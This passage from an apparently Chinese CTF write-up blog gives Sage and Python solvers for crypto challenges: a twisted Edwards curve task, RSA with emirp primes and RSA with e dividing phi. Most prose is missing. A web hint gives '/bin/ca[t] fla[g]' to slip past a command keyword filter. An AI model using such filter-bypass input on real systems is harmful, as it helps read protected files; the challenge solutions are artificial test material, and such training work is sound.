encoding="application/x-tex">N=(p+qi)*(p-qi)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">N</span>):</span><br><span class="line">    <span class="comment"># N </span></span><br><span class="line">    f = ZZ[I](N)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    divisors_f = divisors(f)</span><br><span class="line">    <span class="comment">#pq</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> divisors_f:</span><br><span class="line">        a,b = d.real(), d.imag()</span><br><span class="line">        <span class="keyword">if</span> a**<span class="number">2</span> + b**<span class="number">2</span> == N:</span><br><span class="line">            p = <span class="built_in">abs</span>(<span class="built_in">int</span>(a))</span><br><span class="line">            q = <span class="built_in">abs</span>(<span class="built_in">int</span>(b))</span><br><span class="line">            <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h3 id="curve"><a class="markdownIt-Anchor" href="#curve"></a> Curve</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sagemath</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    (x1, y1) = P</span><br><span class="line">    (x2, y2) = Q</span><br><span class="line"></span><br><span class="line">    x3 = (x1*y2 + y1*x2) * inverse(<span class="number">1</span> + d*x1*x2*y1*y2, p) % p</span><br><span class="line">    y3 = (y1*y2 - a*x1*x2) * inverse(<span class="number">1</span> - d*x1*x2*y1*y2, p) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, P</span>):</span><br><span class="line">    Q = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add(Q, P)</span><br><span class="line">        P = add(P, P)</span><br><span class="line">        x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">p = <span class="number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span></span><br><span class="line">a = <span class="number">362</span></span><br><span class="line">d = <span class="number">7</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">gx=bytes_to_long(<span class="string">b&#x27;D0g3xGC&#123;*****************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;y&gt;=PolynomialRing(Zmod(p))</span><br><span class="line">f=(d*gx^<span class="number">2</span>-<span class="number">1</span>)*y^<span class="number">2</span>+(<span class="number">1</span>-a*gx^<span class="number">2</span>)</span><br><span class="line">gy=<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (a*gx^<span class="number">2</span>+gy^<span class="number">2</span>)%p==(<span class="number">1</span>+d*gx^<span class="number">2</span>*gy^<span class="number">2</span>)%p</span><br><span class="line"></span><br><span class="line">G=(gx,gy)</span><br><span class="line"></span><br><span class="line">eG = mul(e, G)</span><br><span class="line"><span class="built_in">print</span>(eG)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)</span></span><br></pre></td></tr></table></figure><p><code></code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mo></mo><mn>1</mn><mo>+</mo><mi>d</mi><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax^{2}+y^{2}\equiv 1+dx^{2}y^{2}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></p><p><code></code>()</p><p>()<br />()</p><p><code>Lst4r</code><a href="https://en.wikipedia.org/wiki/Twisted_Edwards_curve">Twisted_Edwards_curve</a></p><p></p><p><a href="https://tangcuxiaojikuai.xyz/post/187210a7.html"></a></p><p><code>curve</code><code>Ctrl+f</code>QWQ</p><p><code>wp</code><code></code><code></code></p><p><code>Csome</code><br /><strong>CINTASagemathblog</strong></p><h1 id="hectf2024"><a class="markdownIt-Anchor" href="#hectf2024"></a> HECTF2024</h1><p><code>web</code></p><p><code>web</code><code>/bin/ca[t] fla[g]</code>(<code>cat</code>)</p><p><strong></strong></p><p><code>iwebsec</code></p><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h2><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responsibility</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c&#125;&#123;lr</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><br /><img src="https://pic1.zhimg.com/80/v2-1ad756efbef37b149d62b73a955770b0_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-58a35075719f46e3bd7efc1b9aa24de9_1440w.png" alt="" /></p><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">emirp</span>(<span class="params">x</span>):</span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x !=<span class="number">0</span>:</span><br><span class="line">        y = y*<span class="number">10</span> + x%<span class="number">10</span></span><br><span class="line">        x = x//<span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = emirp(p)</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64encode(flag)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"><span class="string">c = 365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>qp(<code>emirp</code>)<br /><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/"></a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># we try to guess the last not-already-guessed digits of both primes</span></span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too large</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too small</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1) % (<span class="number">10</span>**(k+<span class="number">1</span>))) != (n % (<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line">p, q = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span>, <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line"><span class="built_in">print</span>(p*q == n)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode()</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag).decode())</span><br></pre></td></tr></table></figure><p><br /><a href="https://lazzzaro.github.io/2020/12/06/match-RoarCTF-2020/index.html#Reverse">La</a></p><h3 id="seven-more"><a class="markdownIt-Anchor" href="#seven-more"></a> seven more</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMyPrime</span>(<span class="params">nbits, multiplier</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span> * multiplier * getPrime(nbits // <span class="number">2</span>) * getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> is_prime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keys</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getMyPrime(nbits, <span class="number">1009</span> * <span class="number">7</span>)</span><br><span class="line">    q = getMyPrime(nbits, <span class="number">1009</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">1009</span> * <span class="number">7</span></span><br><span class="line">    <span class="keyword">return</span> p, q, n, e</span><br><span class="line"></span><br><span class="line">p, q, n, e = generate_keys(<span class="number">700</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;######&#125;&#x27;</span> + os.urandom(<span class="number">101</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; n.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; q.bit_length()</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &gt; p.bit_length()</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line"><span class="comment">#c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line"><span class="comment">#p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line"><span class="comment">#q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br></pre></td></tr></table></figure><p><code>T0ver.</code> </p><p><code>e</code><code>phi</code><code>AMM</code><a href="https://tover.xyz/p/n-root-in-F/#2024-11-30%E6%9B%B4%E6%96%B0"></a></p><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;HECTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="unsolved"><a class="markdownIt-Anchor" href="#unsolved"></a> (unsolved)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> Curve</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_function</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a = randrange(p)</span><br><span class="line">    b = randrange(q)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = randrange(p)</span><br><span class="line">        y1 = (x1**<span class="number">3</span> + a*x1) % p</span><br><span class="line">        x2 = randrange(n)</span><br><span class="line">        y2 = (x2**<span class="number">3</span> + a*x2 + b) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(y1,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y1,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">            yp = <span class="built_in">pow</span>(y1,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">            yq = <span class="built_in">pow</span>(y1,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">            _,s,t = gcdext(p,q)</span><br><span class="line">            y1 = (s*p*yq + t*q*yp) % p</span><br><span 